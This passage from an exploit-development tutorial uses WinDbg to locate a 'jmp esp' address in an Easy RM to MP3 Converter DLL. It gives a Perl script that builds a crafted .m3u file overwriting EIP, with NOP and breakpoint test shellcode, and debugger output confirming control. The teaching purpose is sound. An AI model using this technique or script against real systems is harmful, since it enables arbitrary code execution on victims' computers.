<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Jump To ShellCode Reliably</title>
</head><body>We have managed to put our shellcode exactly where ESP points at (or, if you look at it from a different angle, ESP points directly at the beginning of our shellcode). If that would not have been the case, we would have looked to the contents of other register addresses and hope to find our buffer back. Anyways, in this particular example, we can use ESP.<br/>
<br/>
The reasoning behind overwriting EIP with the address of ESP was that we want the application to jump to ESP and run the shellcode.<br/>
Jumping to ESP is a very common thing in windows applications. In fact, Windows applications use one or more dll’s, and these dll’s contains lots of code instructions. Furthermore, the addresses used by these dll’s are pretty static. So if we could find a dll that contains the instruction to jump to esp, and if we could overwrite EIP with the address of that instruction in that dll, then it should work, right ?<br/>
Let’s see. First of all, we need to figure out what the opcode for “jmp esp” is.<br/>
<br/>
We can do this by Launching Easy RM to MP3, then opening windbg and hook windbg to the Easy RM to MP3 application. (Just connect it to the process, don’t do anything in Easy RM to MP3). This gives us the advantage that windbg will see all dll’s/modules that are loaded by the application. (It will become clear why I mentioned this)<br/>
<br/>
Upon attaching the debugger to the process, the application will break.<br/>
In the windbg command line, at the bottom of the screen, enter a (assemble) and press return<br/>
Now enter jmp esp and press return<br/>
<br/>
<img src="image.png" /><br/>
<br/>
Press return again.<br/>
Now enter u (unassemble) followed by the address that was shown before entering jmp esp<br/>
<br/>
0:014&gt; u 7c90120e<br/>
ntdll!DbgBreakPoint:<br/>
<span style="color: #ff0000">7c90120e ffe4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;jmp &nbsp; &nbsp; &#09;esp</span><br/>
7c901210 8bff &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;mov &nbsp; &nbsp; &#09;edi,edi<br/>
ntdll!DbgUserBreakPoint:<br/>
7c901212 cc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;int &nbsp; &nbsp; &#09;3<br/>
7c901213 c3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;ret<br/>
7c901214 8bff &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;mov &nbsp; &nbsp; &#09;edi,edi<br/>
7c901216 8b442404 &nbsp;&#09;mov &nbsp; &nbsp; &#09;eax,dword ptr [esp+4]<br/>
7c90121a cc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;int &nbsp; &nbsp; &#09;3<br/>
7c90121b c20400 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#09;ret &nbsp; &nbsp; &#09;4<br/>
<br/>
Next to 7c90120e, you can see ffe4. This is the opcode for jmp esp<br/>
Now we need to find this opcode in one of the loaded dll’s.<br/>
Look at the top of the windbg window, and look for lines that indicate dll’s that belong to the Easy RM to MP3 application :<br/>
<br/>
Microsoft (R) Windows Debugger Version 6.11.0001.404 X86<br/>
Copyright (c) Microsoft Corporation. All rights reserved.<br/>
<br/>
*** wait with pending attach<br/>
Symbol search path is: *** Invalid ***<br/>
****************************************************************************<br/>
* Symbol loading may be unreliable without a symbol search path. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br/>
* Use .symfix to have the debugger choose a symbol path. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br/>
* After setting your symbol path, use .reload to refresh symbol locations. *<br/>
****************************************************************************<br/>
Executable search path is:<br/>
ModLoad: 00400000 004be000 &nbsp; C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe<br/>
ModLoad: 7c900000 7c9b2000 &nbsp; C:\WINDOWS\system32\ntdll.dll<br/>
ModLoad: 7c800000 7c8f6000 &nbsp; C:\WINDOWS\system32\kernel32.dll<br/>
ModLoad: 78050000 78120000 &nbsp; C:\WINDOWS\system32\WININET.dll<br/>
ModLoad: 77c10000 77c68000 &nbsp; C:\WINDOWS\system32\msvcrt.dll<br/>
ModLoad: 77f60000 77fd6000 &nbsp; C:\WINDOWS\system32\SHLWAPI.dll<br/>
ModLoad: 77dd0000 77e6b000 &nbsp; C:\WINDOWS\system32\ADVAPI32.dll<br/>
ModLoad: 77e70000 77f02000 &nbsp; C:\WINDOWS\system32\RPCRT4.dll<br/>
ModLoad: 77fe0000 77ff1000 &nbsp; C:\WINDOWS\system32\Secur32.dll<br/>
ModLoad: 77f10000 77f59000 &nbsp; C:\WINDOWS\system32\GDI32.dll<br/>
ModLoad: 7e410000 7e4a1000 &nbsp; C:\WINDOWS\system32\USER32.dll<br/>
ModLoad: 00330000 00339000 &nbsp; C:\WINDOWS\system32\Normaliz.dll<br/>
ModLoad: 78000000 78045000 &nbsp; C:\WINDOWS\system32\iertutil.dll<br/>
ModLoad: 77c00000 77c08000 &nbsp; C:\WINDOWS\system32\VERSION.dll<br/>
ModLoad: 73dd0000 73ece000 &nbsp; C:\WINDOWS\system32\MFC42.DLL<br/>
ModLoad: 763b0000 763f9000 &nbsp; C:\WINDOWS\system32\comdlg32.dll<br/>
ModLoad: 5d090000 5d12a000 &nbsp; C:\WINDOWS\system32\COMCTL32.dll<br/>
ModLoad: 7c9c0000 7d1d7000 &nbsp; C:\WINDOWS\system32\SHELL32.dll<br/>
ModLoad: 76080000 760e5000 &nbsp; C:\WINDOWS\system32\MSVCP60.dll<br/>
ModLoad: 76b40000 76b6d000 &nbsp; C:\WINDOWS\system32\WINMM.dll<br/>
ModLoad: 76390000 763ad000 &nbsp; C:\WINDOWS\system32\IMM32.DLL<br/>
ModLoad: 773d0000 774d3000 &nbsp; C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll<br/>
ModLoad: 74720000 7476c000 &nbsp; C:\WINDOWS\system32\MSCTF.dll<br/>
ModLoad: 755c0000 755ee000 &nbsp; C:\WINDOWS\system32\msctfime.ime<br/>
ModLoad: 774e0000 7761d000 &nbsp; C:\WINDOWS\system32\ole32.dll<br/>
<span style="color: #ff0000">ModLoad: 10000000 10071000 &nbsp; C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll</span><br/>
ModLoad: 71ab0000 71ac7000 &nbsp; C:\WINDOWS\system32\WS2_32.dll<br/>
ModLoad: 71aa0000 71aa8000 &nbsp; C:\WINDOWS\system32\WS2HELP.dll<br/>
<span style="color: #ff0000">ModLoad: 00ce0000 00d7f000 &nbsp; C:\Program Files\Easy RM to MP3 Converter\MSRMfilter01.dll<br/>
ModLoad: 01a90000 01b01000 &nbsp; C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec00.dll<br/>
ModLoad: 00c80000 00c87000 &nbsp; C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec01.dll<br/>
</span><span style="color: #ff0000">ModLoad: 01b10000 01fdd000 &nbsp; C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll</span><br/>
ModLoad: 01fe0000 01ff1000 &nbsp; C:\WINDOWS\system32\MSVCIRT.dll<br/>
ModLoad: 77120000 771ab000 &nbsp; C:\WINDOWS\system32\OLEAUT32.dll<br/>
<br/>
If we can find the opcode in one of these dll’s, then we have a good chance of making the exploit work reliably across windows platforms. If we need to use a dll that belongs to the OS, then we might find that the exploit does not work for other versions of the OS. So let’s search the area of one of the Easy RM to MP3 dll’s first.<br/>
We’ll look in the area of C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll. This dll is loaded between 01b10000 and 01fd000. Search this area for ff e4 :<br/>
<br/>
0:014&gt; s 01b10000 l 01fdd000 ff e4<br/>
01ccf23a &nbsp;ff e4 ff 8d 4e 10 c7 44-24 10 ff ff ff ff e8 f3 &nbsp;&#09;&#09; ....N..D$.......<br/>
01d0023f &nbsp;ff e4 fb 4d 1b a6 9c ff-ff 54 a2 ea 1a d9 9c ff &nbsp;&#09; ...M.....T......<br/>
01d1d3db &nbsp;ff e4 ca ce 01 20 05 93-19 09 00 00 00 00 d4 d1 &nbsp;..... ..........<br/>
01d3b22a &nbsp;ff e4 07 07 f2 01 57 f2-5d 1c d3 e8 09 22 d5 d0 &nbsp; ......W.]...."..<br/>
01d3b72d &nbsp;ff e4 09 7d e4 ad 37 df-e7 cf 25 23 c9 a0 4a 26 &nbsp; &nbsp;...}..7...%#..J&amp;<br/>
01d3cd89 &nbsp;ff e4 03 35 f2 82 6f d1-0c 4a e4 19 30 f7 b7 bf &nbsp;&#09; ...5..o..J..0...<br/>
01d45c9e &nbsp;ff e4 5c 2e 95 bb 16 16-79 e7 8e 15 8d f6 f7 fb &#09; ..\.....y.......<br/>
01d503d9 &nbsp;ff e4 17 b7 e3 77 31 bc-b4 e7 68 89 bb 99 54 9d &nbsp;.....w1...h...T.<br/>
01d51400 &nbsp;ff e4 cc 38 25 d1 71 44-b4 a3 16 75 85 b9 d0 50 &nbsp;...8%.qD...u...P<br/>
01d5736d &nbsp;ff e4 17 b7 e3 77 31 bc-b4 e7 68 89 bb 99 54 9d &nbsp;.....w1...h...T.<br/>
01d5ce34 &nbsp;ff e4 cc 38 25 d1 71 44-b4 a3 16 75 85 b9 d0 50 &nbsp;...8%.qD...u...P<br/>
01d60159 &nbsp;ff e4 17 b7 e3 77 31 bc-b4 e7 68 89 bb 99 54 9d &nbsp;.....w1...h...T.<br/>
01d62ec0 &nbsp;ff e4 cc 38 25 d1 71 44-b4 a3 16 75 85 b9 d0 50 &nbsp;...8%.qD...u...P<br/>
0221135b &nbsp;ff e4 49 20 02 e8 49 20-02 00 00 00 00 ff ff ff &nbsp;..I ..I ........<br/>
0258ea53 &nbsp;ff e4 ec 58 02 00 00 00-00 00 00 00 00 08 02 a8 &nbsp;...X............<br/>
<br/>
Excellent. (I did not expect otherwise… jmp esp is a pretty common instruction). When selecting an address, it is important to look for null bytes. You should try to avoid using addresses with null bytes (especially if you need to use the buffer data that comes after the EIP overwrite. The null byte would become a string terminator and the rest of the buffer data will become unusable).<br/>
<br/>
Another good area to search for opcodes is<br/>
<br/>
“s 70000000 l fffffff ff e4” (which would typically give results from windows dll’s)<br/>
<br/>
Note : there are other ways to get opcode addresses :<br/>
<ul><li>&nbsp;<a href="http://www.securiteam.com/tools/5LP0C1PEUY.html">findjmp</a>&nbsp;(from Ryan Permeh) : compile findjmp.c and run with the following parameters : </li>
<li style="list-style-type: none"><ul><li>findjmp &nbsp;. Suppose you want to look for jumps to esp in kernel32.dll, run “findjmp kernel32.dll esp. On Vista SP2, you should get something like this :</li>
<li style="list-style-type: none"><ul><li><i>Findjmp, Eeye, I2S-LaB </i></li>
<li><i>Findjmp2, Hat-Squad</i></li>
<li>Scanning kernel32.dll for code useable with the esp register</li>
<li>0x773AF74B call esp</li>
<li>Finished Scanning kernel32.dll for code useable with the esp register</li>
<li>Found 1 usable addresses</li>
</ul>
</li>
</ul>
</li>
<li>the <a href="http://www.metasploit.org/users/opcode/msfopcode.cgi">metasploit opcode database</a>&nbsp;</li>
<li>memdump (see one of the next tutorial posts </li>
<li>pvefindaddr, a plugin for Immunity Debugger. In fact, this one is highly recommended because it will automatically filter unreliable pointers. </li>
</ul>
<br/>
Since we want to put our shellcode in ESP (which is placed in our payload string after overwriting EIP), the jmp esp address from the list must not have null bytes. If this address would have null bytes, we would overwrite EIP with an address that contains null bytes. Null byte acts as a string terminator, so everything that follows would be ignored. In some cases, it would be ok to have an address that starts with a null byte. If the address starts with a null byte, because of little endian, the null byte would be the last byte in the EIP register. And if you are not sending any payload after overwrite EIP (so if the shellcode is fed before overwriting EIP, and it is still reachable via a register), then this will work.<br/>
<br/>
Anyways, we will use the payload after overwriting EIP to host our shellcode, so the address should not contain null bytes.<br/>
<br/>
The first address will do : 0x01ccf23a<br/>
<br/>
Verify that this address contains the jmp esp (so unassemble the instruction at 01ccf23a):<br/>
<br/>
0:014&gt; u 01ccf23a<br/>
MSRMCcodec02!CAudioOutWindows::WaveOutWndProc+0x8bfea:<br/>
01ccf23a ffe4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;jmp &nbsp; &nbsp; esp<br/>
<br/>
If we now overwrite EIP with 0x01ccf23a, a jmp esp will be executed. Esp contains our shellcode… so we should now have a working exploit. Let’s test with our “NOP &amp; break” shellcode.<br/>
<br/>
Close windbg.<br/>
Create a new m3u file using the script below :<br/>
<br/>
my $file= "test1.m3u";<br/>
my $junk= "A" x 26094;<br/>
my $eip = pack('V',0x01ccf23a); &nbsp;<br/>
my $shellcode = "\x90" x 25; <br/>
$shellcode = $shellcode."\xcc"; #this will cause the application to break, simulating shellcode, but allowing you to further debug<br/>
$shellcode = $shellcode."\x90" x 25; <br/>
open($FILE,"&gt;$file");<br/>
print $FILE $junk.$eip.$shellcode;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
21c.e54): Break instruction exception - code 80000003 (!!! second chance !!!)<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=0000662c<br/>
eip=000ff745 esp=000ff730 ebp=003440c0 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe nc<br/>
cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0xff734:<br/>
000ff745 cc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;int &nbsp; &nbsp; 3<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff740 &nbsp;90 90 90 90 90 cc 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff750 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 00 &nbsp;................<br/>
000ff760 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
<br/>
Run the application again, attach windbg, press "g" to continue to run, and open the new m3u file in the application.<br/>
The application now breaks at address 000ff745, which is the location of our first break. So the jmp esp worked fine (esp started at 000ff730, but it contains NOPs all the way up to 000ff744).<br/>
All we need to do now is put in our real shellcode and finalize the exploit.<br/>
Close windbg again.<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>